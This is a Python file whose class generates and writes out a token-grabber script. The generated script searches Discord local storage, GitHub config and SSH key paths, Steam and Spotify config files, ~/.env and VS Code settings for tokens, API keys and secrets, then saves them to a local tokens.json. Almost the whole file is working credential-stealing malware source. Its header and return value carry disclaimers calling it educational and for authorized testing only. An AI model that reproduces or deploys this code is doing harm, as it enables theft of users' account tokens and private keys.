"""
Token Grabber - Extract Authentication Tokens
WARNING: For authorized testing and educational purposes only.
"""
import os
import tempfile
import json
import re
from typing import Dict, List, Optional
from datetime import datetime


class TokenGrabber:
    """Token extraction tool"""
    
    def create_token_grabber(self, target_types: List[str] = None) -> Dict:
        """Create token grabber"""
        target_types = target_types or ['discord', 'github', 'steam', 'spotify', 'generic']
        
        code = f'''"""
Educational Token Grabber - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import json
import re
import sqlite3
import shutil
from datetime import datetime

def get_discord_tokens():
    """Extract Discord tokens"""
    tokens = []
    
    # Discord token locations
    discord_paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
        os.path.expanduser('~/Library/Application Support/discord/Local Storage/leveldb')
    ]
    
    token_pattern = re.compile(r'[mn][a-zA-Z0-9]{{23}}\\.[a-zA-Z0-9-]{{6}}\\.[a-zA-Z0-9-]{{27}}')
    
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            for root, dirs, files in os.walk(discord_path):
                for file in files:
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                tokens.extend(matches)
                        except:
                            pass
    
    return list(set(tokens))

def get_github_tokens():
    """Extract GitHub tokens"""
    tokens = []
    
    # GitHub token locations
    github_paths = [
        os.path.expanduser('~/.gitconfig'),
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/.ssh/id_ed25519'),
        os.path.join(os.getenv('USERPROFILE'), '.gitconfig'),
        os.path.join(os.getenv('USERPROFILE'), '.ssh', 'id_rsa'),
        os.path.join(os.getenv('USERPROFILE'), '.ssh', 'id_ed25519')
    ]
    
    token_pattern = re.compile(r'ghp_[a-zA-Z0-9]{{36}}')
    ssh_key_pattern = re.compile(r'-----BEGIN (OPENSSH|RSA|EC) PRIVATE KEY-----')
    
    for github_path in github_paths:
        if os.path.exists(github_path):
            try:
                with open(github_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Check for GitHub tokens
                    token_matches = token_pattern.findall(content)
                    tokens.extend(token_matches)
                    
                    # Check for SSH keys
                    if ssh_key_pattern.search(content):
                        tokens.append(f"SSH_KEY_FOUND: {{github_path}}")
            except:
                pass
    
    return list(set(tokens))

def get_steam_tokens():
    """Extract Steam tokens"""
    tokens = []
    
    steam_paths = [
        os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Steam', 'config', 'config.vdf'),
        os.path.join(os.getenv('PROGRAMFILES'), 'Steam', 'config', 'config.vdf'),
        os.path.expanduser('~/.steam/steam/config/config.vdf'),
        os.path.expanduser('~/Library/Application Support/Steam/config/config.vdf')
    ]
    
    for steam_path in steam_paths:
        if os.path.exists(steam_path):
            try:
                with open(steam_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Steam session tokens
                    token_pattern = re.compile(r'"Token"\\s+"([^"]+)"')
                    matches = token_pattern.findall(content)
                    tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def get_spotify_tokens():
    """Extract Spotify tokens"""
    tokens = []
    
    spotify_paths = [
        os.path.join(os.getenv('APPDATA'), 'Spotify', 'prefs'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Spotify', 'prefs'),
        os.path.expanduser('~/.config/spotify/prefs'),
        os.path.expanduser('~/Library/Application Support/Spotify/prefs')
    ]
    
    for spotify_path in spotify_paths:
        if os.path.exists(spotify_path):
            try:
                with open(spotify_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Spotify tokens
                    token_pattern = re.compile(r'oauth_token=([a-zA-Z0-9_-]+)')
                    matches = token_pattern.findall(content)
                    tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def get_generic_tokens():
    """Extract generic tokens from common locations"""
    tokens = []
    
    # Common token patterns
    token_patterns = [
        (re.compile(r'Bearer\\s+([a-zA-Z0-9._-]+)'), 'Bearer'),
        (re.compile(r'api[_-]?key[=:]\\s*([a-zA-Z0-9_-]+)', re.IGNORECASE), 'API Key'),
        (re.compile(r'access[_-]?token[=:]\\s*([a-zA-Z0-9._-]+)', re.IGNORECASE), 'Access Token'),
        (re.compile(r'secret[=:]\\s*([a-zA-Z0-9._-]+)', re.IGNORECASE), 'Secret'),
        (re.compile(r'token[=:]\\s*([a-zA-Z0-9._-]+)', re.IGNORECASE), 'Token')
    ]
    
    # Common config file locations
    config_paths = [
        os.path.expanduser('~/.env'),
        os.path.expanduser('~/.config'),
        os.path.join(os.getenv('APPDATA'), 'Code', 'User', 'settings.json'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Code', 'User', 'settings.json')
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            if os.path.isfile(config_path):
                try:
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        for pattern, token_type in token_patterns:
                            matches = pattern.findall(content)
                            for match in matches:
                                tokens.append(f"{{token_type}}: {{match}}")
                except:
                    pass
            elif os.path.isdir(config_path):
                for root, dirs, files in os.walk(config_path):
                    for file in files:
                        if file.endswith(('.json', '.env', '.config', '.ini', '.yaml', '.yml')):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    for pattern, token_type in token_patterns:
                                        matches = pattern.findall(content)
                                        for match in matches:
                                            tokens.append(f"{{token_type}}: {{match}}")
                            except:
                                pass
    
    return list(set(tokens))

# Main execution
target_types = {target_types}
collected_tokens = {{
    'timestamp': datetime.now().isoformat(),
    'discord': [],
    'github': [],
    'steam': [],
    'spotify': [],
    'generic': []
}}

if 'discord' in target_types:
    print("Extracting Discord tokens...")
    collected_tokens['discord'] = get_discord_tokens()
    print(f"Found {{len(collected_tokens['discord'])}} Discord tokens")

if 'github' in target_types:
    print("Extracting GitHub tokens...")
    collected_tokens['github'] = get_github_tokens()
    print(f"Found {{len(collected_tokens['github'])}} GitHub tokens/keys")

if 'steam' in target_types:
    print("Extracting Steam tokens...")
    collected_tokens['steam'] = get_steam_tokens()
    print(f"Found {{len(collected_tokens['steam'])}} Steam tokens")

if 'spotify' in target_types:
    print("Extracting Spotify tokens...")
    collected_tokens['spotify'] = get_spotify_tokens()
    print(f"Found {{len(collected_tokens['spotify'])}} Spotify tokens")

if 'generic' in target_types:
    print("Extracting generic tokens...")
    collected_tokens['generic'] = get_generic_tokens()
    print(f"Found {{len(collected_tokens['generic'])}} generic tokens")

# Save results
with open('tokens.json', 'w') as f:
    json.dump(collected_tokens, f, indent=2)

print("\\nToken data saved to tokens.json")
print("\\nWARNING: These tokens are sensitive. Handle with care!")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"token_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'token_grabber',
            'file': filepath,
            'target_types': target_types,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
